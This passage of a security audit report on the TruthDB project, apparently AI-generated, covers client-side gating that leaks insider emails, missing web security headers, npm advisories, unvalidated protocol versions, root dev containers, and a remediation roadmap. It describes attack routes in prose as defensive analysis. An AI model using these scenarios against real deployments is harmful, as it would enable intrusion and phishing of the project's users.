**Remediation.** `lstat` the destination and refuse/unlink if it's a symlink; write to a temp file in the same dir and atomically rename; `fchmod` the fresh fd rather than `chmod` a path that could be a symlink.

---

#### TDB-20 · LOW · Website pre-launch gate is client-side only; allowlist emails shipped in the bundle

- **Location:** `website/src/App.vue:23–36`, `website/src/lib/launch.ts:13–20`, `website/src/router/index.ts:3`
- **CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-200 (Information Exposure)

**Description.** The pre-launch gate is enforced entirely in the browser: `App.vue` swaps `<RouterView>`/`<ComingSoon>` from `isPreviewer(user.email)`. The gated content is **not** code-split (`router/index.ts` statically imports `Home`), so the full pre-launch site ships in the public JS bundle Firebase Hosting serves to everyone. Additionally, `VITE_PREVIEW_ALLOWLIST` is inlined into the bundle at build time, so the **raw email addresses** of insiders/early-access users are readable in the shipped JS. The devs already document that the gate "is NOT a security boundary."

**Attack scenario.** An anonymous visitor opens DevTools and reads the compiled `Home`/i18n content out of the bundle (or patches the `gate` computed to force render), and greps the bundle for the allowlist to harvest insider emails for phishing. Impact is limited: the gated content is marketing copy destined to become public, and Firebase web config keys are public-by-design. The **email disclosure** is the concrete leak worth fixing.

**Remediation.** Treat the gate as UX-only. Do not ship the allowlist to the client — enforce previewer membership server-side (Firebase custom claims / a gated backend checking an ID token), or at minimum compare against hashed identifiers, not raw emails. If any pre-launch content ever becomes sensitive, serve it behind a server-side authorization check rather than a static public bundle.

---

#### TDB-21 · LOW · Missing web security headers (CSP, X-Frame-Options, nosniff, Referrer-Policy)

- **Location:** `website/firebase.json:11–30`, `website/index.html`
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers / clickjacking), CWE-693 (Protection Mechanism Failure)

**Description.** The hosting `headers` block sets only `Cache-Control`. There is no `X-Frame-Options`/CSP `frame-ancestors` (so any site can iframe the SPA, including `AuthModal.vue` which collects a password and offers Google sign-in → clickjacking / UI-redress), no `Content-Security-Policy` (the app dynamically injects a `googletagmanager.com` script with no origin allowlist; a future injection or dependency compromise has nothing to contain it), no `X-Content-Type-Options: nosniff`, and no `Referrer-Policy`. No XSS sink exists in the current components — these are the absent defense-in-depth layers.

**Remediation.** Add a `headers` rule for `"**"` in `firebase.json`: `Content-Security-Policy` (`default-src 'self'`; `script-src 'self' https://www.googletagmanager.com`; `connect-src` for GA/Firebase; `object-src 'none'`; `base-uri 'self'`; `frame-ancestors 'none'`), plus `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and `Referrer-Policy: strict-origin-when-cross-origin`. Firebase Hosting serves these verbatim.

---

#### TDB-26 · LOW · Website npm dependencies — dev-tooling vulnerabilities + 2 moderate runtime advisories (`npm audit`)

- **Location:** `website/package-lock.json`
- **CWE:** CWE-1395 (Dependency on vulnerable third-party component)
- **Tooling:** `npm audit`, 2026-07-10. 11 advisories (6 high, 5 moderate) — but severity is dominated by **dev/build tooling that never reaches the browser**, so the shipped risk is low.

**Description.**
- **What actually ships is low-risk.** `npm audit --omit=dev` reports only **2 moderate** advisories, both transitive: `protobufjs` (≤ 7.6.2, schema-derived names can shadow runtime-significant properties — pulled in by `firebase`/Firestore) and `postcss`. Both have non-breaking fixes.
- **The 6 "high" advisories are all dev/build tooling** (transitive under `eslint`, `vite`, `vue-tsc`) and are **not** part of the static bundle served to visitors: `lodash` (code injection / prototype pollution, via `eslint-plugin-vue`), `minimatch` / `picomatch` / `brace-expansion` (ReDoS), `flatted` (unbounded-recursion DoS / prototype pollution), `js-yaml`, `ajv`, and a `vite` `server.fs.deny` bypass. They matter to CI/developer hygiene (e.g. a malicious PR exercising eslint's glob matching), not to end users. The site's runtime deps are only `vue`, `vue-router`, `pinia`, `vue-i18n`, and `firebase`.

**Attack scenario.** For the deployed site, effectively limited to the 2 moderate transitive advisories, which need attacker-controlled protobuf/CSS reaching a client that mostly talks to Firebase — low practical impact. The dev-tooling "highs" are only reachable if CI/lint processes attacker-controlled input.

**Remediation.** Run `npm audit fix` (all listed fixes are available and flagged non-breaking). Prioritise the `--omit=dev` (runtime) advisories and keep `firebase` current. Add `npm audit --omit=dev` as a blocking CI gate for shipped deps, plus a separate non-blocking full `npm audit` for dev tooling.

---

### Informational

---

#### TDB-22 · INFO · Protocol version from the client is never validated

- **Location:** `truthdb/crates/truthdb-core/src/dispatcher.rs:23`
- **CWE:** CWE-20 (Improper Input Validation)

The `HelloReq` handler decodes the request only to discard it and never compares `req.protocol_version` against `PROTOCOL_VERSION` before serving `CommandReq`/`HeartbeatReq` (documented as intentional "no negotiation yet"). Opcodes *are* validated (`MsgType::try_from`). Minimal impact on its own, but the intended version gate is absent — close it alongside the [TDB-01](#tdb-01--critical--database-protocol-has-no-authentication) handshake work by validating the version and refusing further dispatch on mismatch.

---

#### TDB-23 · INFO · Local dev/bench containers run as root with seccomp disabled

- **Location:** `orchestrator/scripts/docker_repl.sh:148–152`, `orchestrator/scripts/docker_bench.sh:130–134`, `truthdb/Dockerfile.repl`, `truthdb/Dockerfile.bench`
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)

The dev/bench scripts pass `--security-opt seccomp=unconfined` (a documented io_uring-under-Docker-Desktop requirement) and the images define no `USER`, so the DB runs as root with an unfiltered syscall surface. **Exposure is confined to local dev:** neither script publishes a host port, so the container DB isn't reachable from host/network. Documented for completeness. Where io_uring permits, prefer a tailored seccomp profile over fully unconfined and add a non-root `USER`.

---

#### TDB-24 · INFO · Rootfs payload extracted as root without verification (control belongs upstream)

- **Location:** `installer/src/platform/install.rs:61–81` (`extract_rootfs_payload`)
- **CWE:** CWE-494

`extract_rootfs_payload()` runs `tar --zstd -xpf <payload> -C /mnt` as root with no SHA-256/GPG check. This is **not** independently exploitable: the payload ships inside the same initramfs as the installer binary, so anyone who can tamper with the payload can equally tamper with the installer — runtime verification here adds little. The meaningful control lives **upstream**: `installer-iso/build_rootfs_payload.sh` builds the payload via debootstrap against an HTTP mirror and curls release assets. Ensure the ISO build verifies every externally fetched artifact (debootstrap GPG keyring; release assets via signature per [TDB-13](#tdb-13--low--release-artifacts-authenticated-by-same-origin-checksum-no-independent-signature)) and that the kernel/initramfs are covered by Secure Boot so the trust chain anchors at boot.

---

## 6. Prioritised remediation roadmap

### P0 — Release blockers (do before any untrusted exposure / before shipping the installer)

| # | Action | Finding |
|---|--------|---------|
| 1 | Add a mandatory authentication handshake; reject `CommandReq` until authenticated | [TDB-01](#tdb-01--critical--database-protocol-has-no-authentication) |
| 2 | Remove the hardcoded `123456`; prompt for a password or provision an SSH key, and force `chage -d 0` | [TDB-02](#tdb-02--critical--hardcoded-default-password-123456-for-root-and-a-sudo-user) |
| 3 | Default bind to `127.0.0.1`; don't auto-start unconfigured; refuse non-loopback bind without auth+TLS | [TDB-04](#tdb-04--high--default-bind-0000--auto-start-on-install-exposes-the-db-to-the-network) |

### P1 — Network-exposure hardening (next)

| # | Action | Finding |
|---|--------|---------|
| 4 | Terminate connections with TLS (mTLS also covers auth) | [TDB-03](#tdb-03--high--no-transport-encryption-plaintext-tcp) |
| 5 | Connection cap + read/idle timeout + non-eager payload allocation | [TDB-05](#tdb-05--high--unauthenticated-connection-exhaustion--memory-dos) |
| 6 | Fix apt CI injection (env var + allowlist) and isolate the GPG-signing job | [TDB-06](#tdb-06--high--ci-shell-injection-in-the-apt-publisher-next-to-the-gpg-signing-key) |

### P2 — Confidentiality, robustness, supply chain

| # | Action | Finding |
|---|--------|---------|
| 7 | Data file `0o600`; decide + implement (or document) at-rest encryption | [TDB-07](#tdb-07--medium--data--wal-file-world-readable-0o644-no-encryption-at-rest) |
| 8 | Per-request cost caps + timeout; `RwLock`/per-index locking | [TDB-08](#tdb-08--medium--unbounded-per-request-work-under-a-global-engine-mutex) |
| 9 | Pin all third-party GitHub Actions to commit SHAs | [TDB-09](#tdb-09--medium--firebase-deploy-action-pinned-to-a-mutable-v0-tag-while-holding-the-service-account-secret), [TDB-11](#tdb-11--low--third-party-github-actions-pinned-to-mutable-tags) |
| 10 | Sign release artifacts with an out-of-CI key; verify signatures (not same-origin checksums) | [TDB-13](#tdb-13--low--release-artifacts-authenticated-by-same-origin-checksum-no-independent-signature), [TDB-24](#tdb-24--info--rootfs-payload-extracted-as-root-without-verification-control-belongs-upstream) |
| 11 | Env-var + validate tags in release workflows; pin base images by digest; verify rustup | [TDB-10](#tdb-10--low--release-workflow-tag-flows-into-run-scripts-command-injection-on-tag-push), [TDB-12](#tdb-12--low--docker-base-images-pinned-to-floating-tags-not-digests), [TDB-14](#tdb-14--low--toolchain-bootstrapped-via-curl--sh) |
| 12 | `cargo update` across repos for the flagged advisories; add `cargo audit`/`cargo-deny` as a CI gate; plan the `bincode` migration | [TDB-25](#tdb-25--medium--vulnerable-and-unmaintained-dependencies-cargo-audit) |

### P3 — Defense-in-depth / correctness

| # | Action | Finding |
|---|--------|---------|
| 13 | Validate on-disk offsets/sizes before use; recover from mutex poisoning | [TDB-15](#tdb-15--low--on-disk-descriptor-trusted-via-non-cryptographic-checksum-unbounded-startup-allocation), [TDB-17](#tdb-17--low--global-engine-mutex-poisoning-causes-permanent-dos-until-restart) |
| 14 | Harden installer disk-in-use interlock (swap/LVM/RAID/overlay) | [TDB-16](#tdb-16--low--installer-disk-in-use-detection-misses-swap--lvm--raid--overlay) |
| 15 | Fail closed on GitHub auth errors; symlink-safe workspace writes | [TDB-18](#tdb-18--low--orchestrator-silently-falls-back-to-unauthenticated-github-requests-on-401403), [TDB-19](#tdb-19--low--workspace-update-follows-symlinks-on-write-arbitrary-file-overwrite) |
| 16 | Add web security headers; move preview allowlist server-side | [TDB-21](#tdb-21--low--missing-web-security-headers), [TDB-20](#tdb-20--low--website-pre-launch-gate-is-client-side-only-allowlist-emails-shipped-in-the-bundle) |
| 17 | Validate protocol version; tighten dev-container privileges | [TDB-22](#tdb-22--info--protocol-version-from-the-client-is-never-validated), [TDB-23](#tdb-23--info--local-devbench-containers-run-as-root-with-seccomp-disabled) |
| 18 | `npm audit fix` on the website (prioritise runtime deps); add `npm audit` CI gates | [TDB-26](#tdb-26--low--website-npm-dependencies--dev-tooling-vulnerabilities--2-moderate-runtime-advisories-npm-audit) |

---

## 7. Cross-cutting themes

1. **The trust boundary is undefined.** The DB is written as if `:9623` is on a trusted network and the host has no untrusted local users. Neither assumption is stated or enforced. **Decide and document the trust boundary**, then make the defaults enforce it (loopback-only until auth+TLS are configured). This single decision drives TDB-01/03/04/07.
2. **No cryptography anywhere.** No auth, no TLS, no at-rest encryption, no keyed integrity (xxh64 only), no artifact signatures. The `created_salt` header field shows encryption was *anticipated* but never built. A crypto crate (`rustls` + `ring`/`aes-gcm`) and a signing story should be planned as first-class, not bolted on later.
3. **Supply chain leans on GitHub + mutable tags.** Same-origin checksums, floating action/image tags, and `curl | sh` mean "trust whoever controls the GitHub release/tag/CDN." Independent signatures (cosign/GPG held outside CI) + SHA-pinning would harden the whole installer/apt distribution chain (TDB-06/09/11/12/13/14/24).
4. **Fail-open patterns.** The GitHub-auth fallback (TDB-18), the client-side gate (TDB-20), and the mutex-poison behavior (TDB-17) all degrade toward "keep going / expose more" on error. Prefer fail-closed.

---

## 8. Methodology, confidence & limitations

**How this review was produced.** Fifteen independent audit agents each took a scoped slice of the workspace (network protocol, storage/`unsafe`, engine, listener, server config/auth, installer execution, installer disks, orchestrator git/github, orchestrator release, website auth, website XSS/headers, CI workflows, apt/packaging, build scripts, and a cross-repo secrets/deps/architecture sweep). Every candidate finding was then re-examined by **two independent verifier agents** applying distinct lenses — one re-reading the actual code to confirm the mechanism, one judging real-world exploitability under the threat model. A finding was kept only if it survived (both verifiers rejecting it dropped it). **42 of 43** raw findings survived; **1** was rejected. The two Criticals and the key supporting facts (default bind, eager allocation, `0o644`, postinst auto-start, apt CI injection) were additionally **confirmed by hand** against the source for this report, then consolidated into the 24 entries above.

**Confidence.** High for everything hand-verified and for the multiply-corroborated clusters (the "no auth" issue was found by 5 agents, the DoS cluster by 6, "no TLS" by 4). One finding (TDB-17) is marked *PLAUSIBLE*: the outcome is certain given a panic under the lock, but a specific attacker-reachable panic was not exhaustively proven.

**Limitations / not done.**
- **Dependency scans: done.** `cargo audit` was run against all three Rust repos and `npm audit` against `website/` (RustSec advisory-db + npm registry, 2026-07-10); results are in [TDB-25](#tdb-25--medium--vulnerable-and-unmaintained-dependencies-cargo-audit) and [TDB-26](#tdb-26--low--website-npm-dependencies--dev-tooling-vulnerabilities--2-moderate-runtime-advisories-npm-audit), with reachability checked via `cargo tree` and `npm audit --omit=dev`. Adding `cargo audit`/`cargo-deny` and `npm audit` as CI gates is recommended.
- **Static review only** — no running instance was fuzzed or exercised. In particular the bincode/serde deserialization path is a worthwhile **fuzzing** target (the framing layer caps size at 8 MiB and validates opcodes, which is good, but decode-time panics were not exhaustively enumerated).
- The aspirational **WASM sandbox** is not implemented and was not assessed.
- No secrets were found committed to the repos. `website/.env.local` contains Firebase web config (public-by-design) and is correctly gitignored; the apt private signing key lives only in CI secrets.

---

*Generated by a Claude Opus 4.8 multi-agent security review. This document is advisory; validate each remediation against current code before implementing.*
